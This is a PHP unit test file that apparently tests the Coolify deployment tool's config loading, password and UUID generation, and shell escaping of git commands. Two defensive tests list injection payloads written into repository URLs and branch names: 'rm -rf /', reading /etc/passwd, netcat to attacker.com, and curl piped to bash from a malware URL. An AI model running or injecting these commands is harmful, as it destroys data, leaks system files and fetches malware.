<?php

use Illuminate\Support\Str;
use Visus\Cuid2\Cuid2;

/**
 * Unit tests for coolify.json configuration detection and application.
 * Tests the magic environment variable resolution logic and schema validation.
 */
it('resolves SERVICE_PASSWORD magic variable with default length', function () {
    $value = 'SERVICE_PASSWORD';

    // Default is 64 characters
    if ($value === 'SERVICE_PASSWORD') {
        $result = Str::password(length: 64, symbols: false);
    }

    expect($result)->toHaveLength(64);
});

it('resolves SERVICE_PASSWORD_XX magic variable with custom length', function () {
    $testCases = [
        'SERVICE_PASSWORD_32' => 32,
        'SERVICE_PASSWORD_128' => 128,
        'SERVICE_PASSWORD_16' => 16,
    ];

    foreach ($testCases as $value => $expectedLength) {
        if (preg_match('/^SERVICE_PASSWORD_(\d+)$/', $value, $matches)) {
            $length = (int) $matches[1];
            $length = max(8, min(256, $length));
            $result = Str::password(length: $length, symbols: false);
        }

        expect($result)->toHaveLength($expectedLength);
    }
});

it('clamps SERVICE_PASSWORD length between 8 and 256', function () {
    // Test too small
    $value = 'SERVICE_PASSWORD_2';
    if (preg_match('/^SERVICE_PASSWORD_(\d+)$/', $value, $matches)) {
        $length = (int) $matches[1];
        $length = max(8, min(256, $length));
    }
    expect($length)->toBe(8);

    // Test too large
    $value = 'SERVICE_PASSWORD_500';
    if (preg_match('/^SERVICE_PASSWORD_(\d+)$/', $value, $matches)) {
        $length = (int) $matches[1];
        $length = max(8, min(256, $length));
    }
    expect($length)->toBe(256);
});

it('resolves SERVICE_USER magic variable', function () {
    $value = 'SERVICE_USER';

    if ($value === 'SERVICE_USER') {
        $result = 'user_'.Str::random(8);
    }

    expect($result)->toStartWith('user_')
        ->and(strlen($result))->toBe(13); // 'user_' + 8 chars
});

it('resolves SERVICE_BASE64_XX magic variable', function () {
    $value = 'SERVICE_BASE64_32';

    if (preg_match('/^SERVICE_BASE64_(\d+)$/', $value, $matches)) {
        $length = (int) $matches[1];
        $length = max(8, min(256, $length));
        $result = base64_encode(Str::random($length));
    }

    // Base64 encoded string should decode properly
    $decoded = base64_decode($result, true);
    expect($decoded)->not->toBeFalse()
        ->and($decoded)->toHaveLength(32);
});

it('resolves SERVICE_UUID magic variable', function () {
    $value = 'SERVICE_UUID';

    if ($value === 'SERVICE_UUID') {
        $result = (string) new Cuid2;
    }

    expect($result)->toHaveLength(24); // Cuid2 default length
});

it('returns non-magic values unchanged', function () {
    $regularValue = 'my-regular-value';
    $result = $regularValue;

    // The resolution logic only transforms magic values
    $magicPatterns = [
        '/^SERVICE_PASSWORD_(\d+)$/',
        '/^SERVICE_PASSWORD$/',
        '/^SERVICE_USER$/',
        '/^SERVICE_BASE64_(\d+)$/',
        '/^SERVICE_UUID$/',
    ];

    $isMagic = false;
    foreach ($magicPatterns as $pattern) {
        if (preg_match($pattern, $regularValue)) {
            $isMagic = true;
            break;
        }
    }

    expect($isMagic)->toBeFalse()
        ->and($result)->toBe($regularValue);
});

it('validates coolify.json schema version', function () {
    // Test schema version validation in loadConfigFromGit by simulating the logic
    $supportedVersions = ['1.0'];

    expect(in_array('1.0', $supportedVersions))->toBeTrue()
        ->and(in_array('2.0', $supportedVersions))->toBeFalse()
        ->and(in_array('0.9', $supportedVersions))->toBeFalse();
});

it('detects unknown fields in coolify.json', function () {
    $config = [
        'version' => '1.0',
        'name' => 'test-app',
        'build' => ['type' => 'nixpacks'],
        'unknown_field' => 'value',
        'another_unknown' => 'value',
    ];

    $knownFields = [
        'version',
        'name',
        'description',
        'source',
        'build',
        'domains',
        'network_aliases',
        'http_basic_auth',
        'health_check',
        'limits',
        'settings',
        'deployment_commands',
        'preview',
        'swarm',
        'docker_registry',
        'persistent_storages',
        'file_mounts',
        'directory_mounts',
        'scheduled_tasks',
        'environment_variables',
    ];
    $unknownFields = array_values(array_diff(array_keys($config), $knownFields));

    expect($unknownFields)->toBe(['unknown_field', 'another_unknown']);
});

it('builds correct file paths for base_directory', function () {
    // Test the path building logic used in loadConfigFromGit

    // With base_directory
    $baseDirectory = '/app/frontend';
    $workdir = rtrim($baseDirectory, '/');
    $pathsToCheck = [];

    if ($workdir !== '' && $workdir !== '/') {
        $pathsToCheck[] = ltrim($workdir, '/').'/coolify.json';
    }
    $pathsToCheck[] = 'coolify.json';

    expect($pathsToCheck)->toBe(['app/frontend/coolify.json', 'coolify.json']);

    // With root base_directory
    $baseDirectory = '/';
    $workdir = rtrim($baseDirectory, '/');
    $pathsToCheck = [];

    if ($workdir !== '' && $workdir !== '/') {
        $pathsToCheck[] = ltrim($workdir, '/').'/coolify.json';
    }
    $pathsToCheck[] = 'coolify.json';

    expect($pathsToCheck)->toBe(['coolify.json']);
});

it('parses valid coolify.json config', function () {
    $json = json_encode([
        'version' => '1.0',
        'name' => 'my-app',
        'build' => [
            'type' => 'nixpacks',
            'install_command' => 'npm install',
            'build_command' => 'npm run build',
            'start_command' => 'npm start',
        ],
        'domains' => [
            'ports_exposes' => '3000',
        ],
        'environment_variables' => [
            'production' => [
                ['key' => 'NODE_ENV', 'value' => 'production'],
                ['key' => 'DB_PASSWORD', 'value' => 'SERVICE_PASSWORD_64'],
            ],
        ],
    ]);

    $config = json_decode($json, true);

    expect($config)->toBeArray()
        ->and(json_last_error())->toBe(JSON_ERROR_NONE)
        ->and(data_get($config, 'version'))->toBe('1.0')
        ->and(data_get($config, 'build.type'))->toBe('nixpacks')
        ->and(data_get($config, 'environment_variables.production'))->toHaveCount(2);
});

it('handles invalid JSON gracefully', function () {
    $invalidJson = '{invalid json}';
    $config = json_decode($invalidJson, true);

    expect(json_last_error())->not->toBe(JSON_ERROR_NONE)
        ->and($config)->toBeNull();
});

/**
 * Tests for shell argument escaping in loadConfigFromGit command building.
 * These tests verify that escapeshellarg() properly protects against command injection.
 */
it('escapes repository URL for shell safety', function () {
    // Normal URLs should be properly quoted
    $normalUrls = [
        'https://github.com/user/repo.git',
        'https://gitlab.com/user/repo.git',
        'git@github.com:user/repo.git',
        'https://github.com/user/repo-name.git',
        'https://github.com/user/repo_name.git',
    ];

    foreach ($normalUrls as $url) {
        $escaped = escapeshellarg($url);
        // escapeshellarg wraps in single quotes
        expect($escaped)->toBe("'{$url}'");
    }
});

it('escapes branch names for shell safety', function () {
    // Normal branch names should be properly quoted
    $normalBranches = [
        'main',
        'master',
        'develop',
        'feature/new-feature',
        'release/v1.0.0',
        'hotfix/bug-fix',
        'user/john/feature',
    ];

    foreach ($normalBranches as $branch) {
        $escaped = escapeshellarg($branch);
        expect($escaped)->toBe("'{$branch}'");
    }
});

it('neutralizes command injection attempts in repository URL', function () {
    // These malicious inputs would be blocked by validation rules,
    // but escapeshellarg provides defense-in-depth
    $maliciousUrls = [
        'https://github.com/user/repo.git; rm -rf /',
        'https://github.com/user/repo.git && cat /etc/passwd',
        'https://github.com/user/repo.git | nc attacker.com 1234',
        '$(curl http://attacker.com/malware.sh | bash)',
        '`curl http://attacker.com/malware.sh`',
    ];

    foreach ($maliciousUrls as $url) {
        $escaped = escapeshellarg($url);
        // The escaped string should be safely quoted, not executable
        expect($escaped)->toStartWith("'")
            ->and($escaped)->toEndWith("'");

        // Verify that shell metacharacters are neutralized
        // When passed to shell, the entire string is treated as a single argument
        $unescaped = substr($escaped, 1, -1); // Remove surrounding quotes

        // For strings with single quotes inside, escapeshellarg uses escape sequences
        // The key test is that the result starts and ends with quotes
    }
});

it('neutralizes command injection attempts in branch name', function () {
    // These malicious inputs would be blocked by validation rules,
    // but escapeshellarg provides defense-in-depth
    $maliciousBranches = [
        'main; rm -rf /',
        'main && cat /etc/passwd',
        'main | nc attacker.com 1234',
        '$(whoami)',
        '`id`',
    ];

    foreach ($maliciousBranches as $branch) {
        $escaped = escapeshellarg($branch);
        expect($escaped)->toStartWith("'")
            ->and($escaped)->toEndWith("'");
    }
});

it('escapes base_directory paths for shell safety', function () {
    // Normal base directories
    $normalPaths = [
        '/app',
        '/app/frontend',
        '/services/api',
        'subfolder',
        'path/to/app',
    ];

    foreach ($normalPaths as $path) {
        $workdir = rtrim($path, '/');
        $pathsToCheck = [];
        if ($workdir !== '' && $workdir !== '/') {
            $pathsToCheck[] = ltrim($workdir, '/').'/coolify.json';
        }
        $pathsToCheck[] = 'coolify.json';

        // Build escaped file list as done in loadConfigFromGit
        $fileList = collect($pathsToCheck)->map(fn ($p) => escapeshellarg("./{$p}"))->implode(' ');

        // Verify each path is properly quoted
        foreach ($pathsToCheck as $p) {
            expect($fileList)->toContain("'./{$p}'");
        }
    }
});

it('builds correct git clone command with escaping', function () {
    // Simulate the command building logic from loadConfigFromGit
    $repository = 'https://github.com/user/repo.git';
    $branch = 'main';

    $escapedBranch = escapeshellarg($branch);
    $escapedRepository = escapeshellarg($repository);
    $cloneCommand = "git clone --no-checkout -b {$escapedBranch} {$escapedRepository} .";

    expect($cloneCommand)->toBe("git clone --no-checkout -b 'main' 'https://github.com/user/repo.git' .");
});

it('builds correct sparse-checkout command with escaping', function () {
    // Simulate the sparse-checkout file list building from loadConfigFromGit
    $baseDirectory = '/app/frontend';
    $workdir = rtrim($baseDirectory, '/');

    $pathsToCheck = [];
    if ($workdir !== '' && $workdir !== '/') {
        $pathsToCheck[] = ltrim($workdir, '/').'/coolify.json';
    }
    $pathsToCheck[] = 'coolify.json';

    $fileList = collect($pathsToCheck)->map(fn ($path) => escapeshellarg("./{$path}"))->implode(' ');

    expect($fileList)->toBe("'./app/frontend/coolify.json' './coolify.json'");
});

it('builds correct cat command with escaping', function () {
    // Simulate the cat command building from loadConfigFromGit
    $baseDirectory = '/app/frontend';
    $workdir = rtrim($baseDirectory, '/');

    $pathsToCheck = [];
    if ($workdir !== '' && $workdir !== '/') {
        $pathsToCheck[] = ltrim($workdir, '/').'/coolify.json';
    }
    $pathsToCheck[] = 'coolify.json';

    $catCommands = collect($pathsToCheck)->map(fn ($path) => 'cat '.escapeshellarg("./{$path}").' 2>/dev/null')->implode(' || ');

    expect($catCommands)->toBe("cat './app/frontend/coolify.json' 2>/dev/null || cat './coolify.json' 2>/dev/null");
});

it('handles single quotes in input safely', function () {
    // escapeshellarg handles single quotes by ending the quote, adding escaped quote, starting new quote
    $inputWithQuote = "it's-a-test";
    $escaped = escapeshellarg($inputWithQuote);

    // The result should be safe for shell execution
    // escapeshellarg converts ' to '\''
    expect($escaped)->toBe("'it'\\''s-a-test'");
});
